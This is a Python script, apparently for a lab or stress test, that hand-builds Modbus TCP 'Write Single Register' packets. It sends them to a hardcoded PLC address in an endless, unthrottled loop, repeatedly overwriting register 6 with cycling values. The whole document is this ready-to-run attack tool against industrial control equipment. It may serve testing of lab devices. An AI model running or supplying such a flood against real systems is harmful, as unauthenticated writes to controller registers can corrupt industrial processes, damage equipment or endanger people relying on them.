import socket
import time
import binascii

def log_packet(tid, sent, received):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    sent_hex = binascii.hexlify(sent).decode()
    received_hex = binascii.hexlify(received).decode() if received else "None"
    print(f"[{timestamp}] TID {tid} | Enviado: {sent_hex} | Recebido: {received_hex}")

def send_modbus_packet(ip, port, packet, tid):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    resp = None
    try:
        s.connect((ip, port))
        s.sendall(packet)
        resp = s.recv(1024)
        return resp
    except Exception as e:
        print(f"TID {tid} | Erro: {e}")
        return None
    finally:
        s.close()
        log_packet(tid, packet, resp)

def build_mbap(tid, unit_id, pdu_len):
    tid_b = tid.to_bytes(2, 'big')
    pid   = (0).to_bytes(2, 'big')
    length = (pdu_len + 1).to_bytes(2, 'big')  # +1 do unit_id
    uid   = unit_id.to_bytes(1, 'big')
    return tid_b + pid + length + uid

def write_single_register(ip, port, unit_id, address, value, tid):
    fc   = (6).to_bytes(1, 'big')
    addr = address.to_bytes(2, 'big')
    val  = value.to_bytes(2, 'big')
    pdu  = fc + addr + val
    mbap = build_mbap(tid, unit_id, len(pdu))
    packet = mbap + pdu
    return send_modbus_packet(ip, port, packet, tid)

if __name__ == "__main__":
    ip = "172.27.224.250"
    port = 502
    unit_id = 1
    address = 6

    value = 10
    tid = 1
    print(f"[!] Stress write FC6 no registo {address}, valor base {value}")

    try:
        while True:
            write_single_register(ip, port, unit_id, address, value, tid)
            tid = (tid + 1) % 65535 or 1
            value = value + 1 if value < 20 else 10
            # time.sleep(0.01)  # ativa para regular a intensidade
    except KeyboardInterrupt:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Interrompido pelo utilizador")
